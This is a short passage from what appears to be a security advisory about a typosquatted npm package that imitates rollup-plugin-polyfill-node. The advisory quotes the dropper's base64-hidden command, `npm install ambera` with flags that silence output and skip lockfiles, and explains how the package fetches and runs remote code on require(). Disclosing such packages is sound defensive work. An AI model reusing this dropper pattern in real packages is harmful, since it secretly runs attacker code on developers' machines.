  "summary": "Typosquat of rollup-plugin-polyfill-node with load-time remote package dropper",
  "details": "On require() of the package's main entry (dist/index.js), top-level code executes a base64-obfuscated command `npm install ambera --no-save --silent --no-audit --no-fund` via child_process.spawn, then require()s the freshly installed `ambera` module (name also base64-hidden) and invokes its plugin. This pulls and executes attacker-controlled code from the npm registry on every load, bypassing lockfiles. The package name mimics the legitimate `rollup-plugin-polyfill-node` (its package.json repository field points at FredKSchott/rollup-plugin-polyfill-node) while the shipped code adds this dropper not present upstream.",
